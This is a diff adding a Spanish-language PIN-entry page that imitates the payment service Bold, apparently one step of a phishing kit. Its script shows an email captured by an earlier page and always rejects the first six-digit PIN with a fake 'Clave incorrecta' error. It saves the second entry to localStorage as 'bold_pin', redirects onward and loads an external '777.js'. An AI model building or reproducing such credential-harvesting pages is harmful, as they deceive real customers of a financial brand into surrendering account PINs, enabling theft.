@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Bold - Clave de acceso</title>
+
+  <!-- Google Fonts: Montserrat -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      /* Color de respaldo si el degradado no se renderiza */
+      background-color: #fbfbff;
+      background-image:
+        /* Halo blanco concentrado detrás del contenido */
+        radial-gradient(
+          circle 55% at 50% 44%,
+          rgba(255, 255, 255, 1) 0%,
+          rgba(255, 255, 255, 0.70) 45%,
+          rgba(255, 255, 255, 0) 68%
+        ),
+        /* Base lavanda hacia los bordes */
+        radial-gradient(
+          circle at 50% 50%,
+          #fbfbff 0%,
+          #eef0ff 58%,
+          #dce1ff 100%
+        );
+      background-attachment: fixed;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+    }
+
+    .screen {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background: transparent; /* deja ver el degradado del body */
+      display: flex;
+      flex-direction: column;
+      padding: 20px 24px 32px;
+      position: relative;
+    }
+
+    .back-btn {
+      background: none;
+      border: none;
+      font-size: 26px;
+      color: #1a1a2e;
+      cursor: pointer;
+      padding: 4px 8px;
+      width: fit-content;
+    }
+
+    .content {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 30px;
+    }
+
+    .cards-img {
+      width: 240px;
+      height: auto;
+      object-fit: contain;
+      margin-bottom: 20px;
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1a1a2e;
+      text-align: center;
+      margin-bottom: 14px;
+      letter-spacing: -0.3px;
+    }
+
+    .email {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a2e;
+      text-align: center;
+      margin-bottom: 14px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a2e;
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .dots {
+      display: flex;
+      gap: 14px;
+      justify-content: center;
+      margin-bottom: 12px;
+    }
+
+    .dots.shake {
+      animation: shake 0.45s ease;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%      { transform: translateX(-9px); }
+      40%      { transform: translateX(9px); }
+      60%      { transform: translateX(-6px); }
+      80%      { transform: translateX(6px); }
+    }
+
+    .dot {
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      border: 1.5px solid #c7c9e0;
+      background: transparent;
+      transition: background 0.15s ease, border-color 0.15s ease;
+    }
+
+    .dot.filled {
+      background: #1a1a2e;
+      border-color: #1a1a2e;
+    }
+
+    .dot.error {
+      background: #ff2b5e;
+      border-color: #ff2b5e;
+    }
+
+    .error-msg {
+      font-size: 13px;
+      font-weight: 600;
+      color: #ff2b5e;
+      text-align: center;
+      height: 18px;
+      line-height: 18px;
+      margin-bottom: 22px;
+      opacity: 0;
+      transition: opacity 0.2s ease;
+    }
+
+    .error-msg.visible {
+      opacity: 1;
+    }
+
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px 14px;
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+
+    .key {
+      background: #eceefc;
+      border: none;
+      border-radius: 18px;
+      height: 62px;
+      font-size: 22px;
+      font-weight: 700;
+      font-family: 'Montserrat', sans-serif;
+      color: #1a1a2e;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.1s ease;
+    }
+
+    .key:active {
+      background: #dcdff5;
+    }
+
+    .key.empty {
+      background: transparent;
+      cursor: default;
+      pointer-events: none;
+    }
+
+    .key .backspace-icon {
+      width: 26px;
+      height: 26px;
+      stroke: #1a1a2e;
+      stroke-width: 2;
+      fill: none;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+    }
+
+    .forgot {
+      background: none;
+      border: none;
+      font-size: 15px;
+      font-weight: 700;
+      font-family: 'Montserrat', sans-serif;
+      color: #1a1a2e;
+      text-decoration: underline;
+      cursor: pointer;
+      margin-top: auto;
+      padding: 8px 0;
+      text-align: left;
+      width: fit-content;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <button class="back-btn" type="button" onclick="history.back()">&#8249;</button>
+
+    <div class="content">
+      <img src="superiorcentrado.png" alt="Bold" class="cards-img" />
+
+      <h1 class="title">Bienvenido</h1>
+      <p class="email" id="usuario">correo@gmail.com</p>
+      <p class="subtitle">Escribe tu clave de acceso</p>
+
+      <div class="dots" id="puntos">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+
+      <p class="error-msg" id="aviso">Clave incorrecta. Vuelve a intentarlo.</p>
+
+      <div class="keypad" id="teclado">
+        <button class="key" data-num="1">1</button>
+        <button class="key" data-num="2">2</button>
+        <button class="key" data-num="3">3</button>
+
+        <button class="key" data-num="4">4</button>
+        <button class="key" data-num="5">5</button>
+        <button class="key" data-num="6">6</button>
+
+        <button class="key" data-num="7">7</button>
+        <button class="key" data-num="8">8</button>
+        <button class="key" data-num="9">9</button>
+
+        <button class="key empty"></button>
+        <button class="key" data-num="0">0</button>
+        <button class="key" data-action="delete">
+          <svg class="backspace-icon" viewBox="0 0 24 24">
+            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
+            <line x1="18" y1="9" x2="12" y2="15" />
+            <line x1="12" y1="9" x2="18" y2="15" />
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <button class="forgot">Olvidé mi clave</button>
+  </div>
+
+  <script>
+    // === 1) Leer email desde localStorage ===
+    const emailGuardado = localStorage.getItem("bold_email");
+    const emailDisplay = document.getElementById("usuario");
+
+    if (emailGuardado) {
+      emailDisplay.textContent = emailGuardado;
+    } else {
+      // Si no hay email, regresar a la pantalla 1
+      window.location.href = "index.html";
+    }
+
+    // === 2) Lógica del teclado numérico ===
+    const MAX_PIN = 6;
+
+    let currentPin = "";
+    let intento = 1;
+    let bloqueado = false;
+
+    const dotsWrap = document.getElementById("puntos");
+    const dots = document.querySelectorAll("#puntos .dot");
+    const keypad = document.getElementById("teclado");
+    const aviso = document.getElementById("aviso");
+
+    keypad.addEventListener("click", (e) => {
+      const btn = e.target.closest(".key");
+      if (!btn || btn.classList.contains("empty") || bloqueado) return;
+
+      const num = btn.dataset.num;
+      const action = btn.dataset.action;
+
+      if (num && currentPin.length < MAX_PIN) {
+        currentPin += num;
+        aviso.classList.remove("visible");
+      } else if (action === "delete") {
+        currentPin = currentPin.slice(0, -1);
+      }
+
+      updateDots();
+
+      if (currentPin.length === MAX_PIN) {
+        if (intento === 1) {
+          // Primer intento: siempre lo marcamos como incorrecto
+          intento = 2;
+          bloqueado = true;
+          mostrarError();
+
+          setTimeout(() => {
+            currentPin = "";
+            dots.forEach((d) => d.classList.remove("error", "filled"));
+            dotsWrap.classList.remove("shake");
+            bloqueado = false;
+          }, 1400);
+
+        } else {
+          // Segundo intento: guardamos y avanzamos
+          bloqueado = true;
+          localStorage.setItem("bold_pin", currentPin);
+
+          setTimeout(() => {
+            window.location.href = "index---.html";
+          }, 400);
+        }
+      }
+    });
+
+    function updateDots() {
+      dots.forEach((dot, i) => {
+        dot.classList.toggle("filled", i < currentPin.length);
+      });
+    }
+
+    function mostrarError() {
+      dots.forEach((dot) => dot.classList.add("error"));
+      dotsWrap.classList.add("shake");
+      aviso.classList.add("visible");
+    }
+  </script>
+
+  <script src="777.js"></script>
+</body>
+</html>
